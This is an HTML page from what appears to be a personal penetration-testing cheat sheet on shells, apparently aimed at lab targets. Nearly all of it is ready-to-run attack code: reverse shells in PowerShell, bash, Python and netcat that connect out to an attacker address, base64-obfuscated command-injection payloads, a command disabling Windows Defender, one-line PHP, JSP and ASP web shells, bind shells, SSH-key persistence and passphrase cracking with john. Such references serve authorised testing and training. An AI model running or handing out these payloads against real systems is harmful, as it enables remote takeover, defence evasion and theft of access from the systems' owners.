<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/assets/css/style.css?v=">


    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->

<!-- Setup theme-color -->
<!-- start theme color meta headers -->
<meta name="theme-color" content="#151515">
<meta name="msapplication-navbutton-color" content="#151515">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<!-- end theme color meta headers -->


<!-- Setup Google Analytics -->



<!-- You can set your favicon here -->
<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->

<!-- end custom head snippets -->


<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Pentest CheatSheet | Pentest CheatSheet</title>
<meta name="generator" content="Jekyll v3.10.0" />
<meta property="og:title" content="Pentest CheatSheet" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Pentest CheatSheet" />
<meta property="og:description" content="Pentest CheatSheet" />
<link rel="canonical" href="http://localhost:4000/zNew/Shell/Shell.html" />
<meta property="og:url" content="http://localhost:4000/zNew/Shell/Shell.html" />
<meta property="og:site_name" content="Pentest CheatSheet" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Pentest CheatSheet" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","description":"Pentest CheatSheet","headline":"Pentest CheatSheet","url":"http://localhost:4000/zNew/Shell/Shell.html"}</script>
<!-- End Jekyll SEO tag -->

  </head>

  <body>
    <header>
      <div class="container">
        <a id="a-title" href="/">
          <h1>Pentest CheatSheet</h1>
        </a>
        <h2>Pentest CheatSheet</h2>

        <section id="downloads">
          
          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
        </section>
      </div>
    </header>

    <div class="container">
      <section id="main_content">
        <h1 id="shell">Shell</h1>
<h2 id="listening-shell">LISTENING SHELL</h2>
<ul>
  <li><code class="language-plaintext highlighter-rouge">nc -lnvp 9999</code></li>
</ul>

<h1 id="reverse-shell"><a href="https://www.revshells.com/">Reverse Shell</a></h1>
<p>With a reverse shell, the attack box will have a listener running, and the target will need to initiate the connection.</p>

<p>If we can execute commands on the target, we can try to create MSFVenom payload and execute it inside target</p>

<h2 id="windows">Windows</h2>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-nop</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"</span><span class="nv">$client</span><span class="s2"> = New-Object System.Net.Sockets.TCPClient('10.10.15.60',443);</span><span class="nv">$stream</span><span class="s2"> = </span><span class="nv">$client</span><span class="s2">.GetStream();[byte[]]</span><span class="nv">$bytes</span><span class="s2"> = 0..65535|%{0};while((</span><span class="nv">$i</span><span class="s2"> = </span><span class="nv">$stream</span><span class="s2">.Read(</span><span class="nv">$bytes</span><span class="s2">, 0, </span><span class="nv">$bytes</span><span class="s2">.Length)) -ne 0){;</span><span class="nv">$data</span><span class="s2"> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(</span><span class="nv">$bytes</span><span class="s2">,0, </span><span class="nv">$i</span><span class="s2">);</span><span class="nv">$sendback</span><span class="s2"> = (iex </span><span class="nv">$data</span><span class="s2"> 2&gt;&amp;1 | Out-String );</span><span class="nv">$sendback2</span><span class="s2"> = </span><span class="nv">$sendback</span><span class="s2"> + 'PS ' + (pwd).Path + '&gt; ';</span><span class="nv">$sendbyte</span><span class="s2"> = ([text.encoding]::ASCII).GetBytes(</span><span class="nv">$sendback2</span><span class="s2">);</span><span class="nv">$stream</span><span class="s2">.Write(</span><span class="nv">$sendbyte</span><span class="s2">,0,</span><span class="nv">$sendbyte</span><span class="s2">.Length);</span><span class="nv">$stream</span><span class="s2">.Flush()};</span><span class="nv">$client</span><span class="s2">.Close()"</span><span class="w">
</span></code></pre></div></div>

<ul>
  <li>https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</li>
</ul>

<h3 id="disable-av">Disable AV</h3>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-MpPreference</span><span class="w"> </span><span class="nt">-DisableRealtimeMonitoring</span><span class="w"> </span><span class="bp">$true</span><span class="w">
</span></code></pre></div></div>

<h2 id="sh-files">sh files</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!\bin/bash </span>

sh <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.5/9999 0&gt;&amp;1
<span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.14.5 9999 <span class="o">&gt;</span>/tmp/fs
</code></pre></div></div>

<h3 id="execute-reverse-shell-file">Execute Reverse Shell File</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Transfir File to Target</span>
<span class="nv">$ </span>curl &lt;MY_IP&gt;:&lt;MY_PORT&gt;/bash.sh <span class="nt">-o</span> /tmp/bash.sh
<span class="nv">$ </span>wget &lt;MY_IP&gt;:&lt;MY_PORT&gt;/bash.sh 

<span class="c"># Execute Shell</span>
<span class="nv">$ </span>./tmp/bash.sh
<span class="nv">$ </span>bash /tmp/bash.sh
</code></pre></div></div>

<h2 id="pyton">Pyton</h2>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'</span>
</code></pre></div></div>

<h2 id="upload-php-file-that-works-like-a-page">Upload PHP file that works like a page</h2>
<p><code class="language-plaintext highlighter-rouge">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</code></p>

<h2 id="payloads-ci">Payloads CI</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Convert reverse shell to base64</span>
<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'sh -i &gt;&amp; /dev/tcp/10.10.14.8/9999 0&gt;&amp;1'</span> | <span class="nb">base64</span>

<span class="c"># Send the payload</span>
<span class="nv">$ </span><span class="nb">echo</span><span class="k">${</span><span class="nv">IFS</span><span class="k">}</span><span class="s2">"c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOC85OTk5IDA+JjEK"</span>|base64<span class="k">${</span><span class="nv">IFS</span><span class="k">}</span><span class="nt">-d</span>|bash

<span class="c"># Execute reverse shell</span>
<span class="nv">$ </span>bash <span class="nt">-c</span><span class="o">(</span><span class="s2">"sh -i &gt;&amp; /dev/tcp/10.10.14.5/4444 0&gt;&amp;1"</span><span class="o">)</span>
<span class="nv">$ </span>curl 10.10.11.116/shell.php <span class="nt">--data-urlencode</span> <span class="s1">'cmd=bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.60/443 0&gt;&amp;1"'</span><span class="sb">`</span>
<span class="nv">$ </span>bash <span class="nt">-c</span> <span class="s1">'sh -i &gt;%26 /dev/tcp/10.10.14.5/9999 0&gt;%261'</span><span class="sb">`</span>
</code></pre></div></div>

<hr />

<h1 id="bind-shells">Bind Shells</h1>
<p>With a bind shell, the target system has a listener started and awaits a connection from a pentester’s system.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash
<span class="nv">$ </span><span class="nb">rm</span> <span class="nt">-f</span> /tmp/f<span class="p">;</span> <span class="nb">mkfifo</span> /tmp/f<span class="p">;</span> <span class="nb">cat</span> /tmp/f | /bin/bash <span class="nt">-i</span> 2&gt;&amp;1 | nc <span class="nt">-l</span> 10.129.41.200 7777 <span class="o">&gt;</span> /tmp/f

<span class="c"># Connect Attack</span>
<span class="nv">$ </span>nc <span class="nt">-nv</span> 10.129.41.200 7777
</code></pre></div></div>

<hr />

<h1 id="web-shells"><a href="https://github.com/jbarcia/Web-Shells/tree/master/laudanum">Web Shells</a></h1>
<p><code class="language-plaintext highlighter-rouge">copy from /usr/share/laudanum</code></p>

<h2 id="php"><a href="https://github.com/WhiteWinterWolf/wwwolf-php-webshell">PHP</a></h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php SYSTEM<span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">'cmd'</span><span class="o">])</span><span class="p">;</span> ?&gt;
</code></pre></div></div>

<h2 id="aspx-antak-webshell"><a href="https://github.com/samratashok/nishang/tree/master/Antak-WebShell">ASPX Antak Webshell</a></h2>
<p><code class="language-plaintext highlighter-rouge">copy from /usr/share/nishang/Antak-WebShell</code></p>

<blockquote>
  <p>Antak is a web shell built-in ASP.Net. Antak utilizes PowerShell to interact with the host, making it great for acquiring a web shell on a Windows server.</p>
</blockquote>

<h2 id="jsp">JSP</h2>
<div class="language-jsp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;%</span> <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">));</span> <span class="nt">%&gt;</span>
</code></pre></div></div>

<h2 id="asp">ASP</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;% eval request("cmd") %&gt;
</code></pre></div></div>

<h2 id="war"><a href="https://github.com/BustedSec/webshell/blob/master/webshell.war">War</a></h2>
<blockquote>
  <p>java/war (Tomcat, Axis2, or WebLogic)</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
<span class="nv">$ </span>zip <span class="nt">-r</span> backup.war cmd.jsp 
</code></pre></div></div>

<h1 id="interactive-shells">Interactive Shells</h1>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Python</span>
python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
<span class="s2">"CTRL+Z"</span>
<span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg
export </span><span class="nv">TERM</span><span class="o">=</span>xterm

<span class="c"># /bin/sh -i</span>
/bin/sh <span class="nt">-i</span>

<span class="c"># Perl</span>
perl —e <span class="s1">'exec "/bin/sh";'</span>

<span class="c">## The command should be run from a script.</span>
perl: <span class="nb">exec</span> <span class="s2">"/bin/sh"</span><span class="p">;</span>


<span class="c"># Ruby</span>
<span class="c">## The command should be run from a script.</span>
ruby: <span class="nb">exec</span> <span class="s2">"/bin/sh"</span>


<span class="c"># Lua</span>
<span class="c">## The command should be run from a script.</span>
lua: os.execute<span class="o">(</span><span class="s1">'/bin/sh'</span><span class="o">)</span>


<span class="c"># AWK</span>
<span class="nb">awk</span> <span class="s1">'BEGIN {system("/bin/sh")}'</span>


<span class="c"># Find</span>
find / <span class="nt">-name</span> nameoffile <span class="nt">-exec</span> /bin/awk <span class="s1">'BEGIN {system("/bin/sh")}'</span> <span class="se">\;</span>


<span class="c"># Using Exec To Launch A Shell</span>
find <span class="nb">.</span> <span class="nt">-exec</span> /bin/sh <span class="se">\;</span> <span class="nt">-quit</span>

<span class="c"># VIM</span>
vim <span class="nt">-c</span> <span class="s1">':!/bin/sh'</span>


<span class="c"># Vim Escape</span>
vim
:set <span class="nv">shell</span><span class="o">=</span>/bin/sh
:shell
</code></pre></div></div>

<h2 id="generate-ssh-key">Generate SSH Key</h2>
<h3 id="victim">Victim</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh-keygen
<span class="nv">$ </span><span class="nb">cd</span> ./ssh
<span class="nv">$ </span><span class="nb">cat </span>id_rsa.pub <span class="o">&gt;</span> authorized_keys
<span class="nv">$ </span><span class="nb">chmod </span>700 ~/
<span class="nv">$ </span><span class="nb">chmod </span>700 ~/.ssh
<span class="nv">$ </span><span class="nb">chmod </span>600 ~/.ssh/authorized_key
</code></pre></div></div>

<h3 id="host">Host</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nano id_rsa
<span class="o">(</span>Copy from id_rsa victim<span class="o">)</span>
<span class="nv">$ </span><span class="nb">chmod </span>400 id_rsa
<span class="nv">$ </span>ssh <span class="nt">-i</span> id_rsa matt@10.10.11.136
</code></pre></div></div>

<h3 id="passphrase">PassPhrase</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 /usr/share/john/ssh2john.py id_rsa <span class="o">&gt;</span> hash.txt
<span class="nv">$ </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt hash.txt
<span class="nv">$ </span>john <span class="nt">--show</span> hash.txt
</code></pre></div></div>


      </section>
    </div>
  </body>
</html>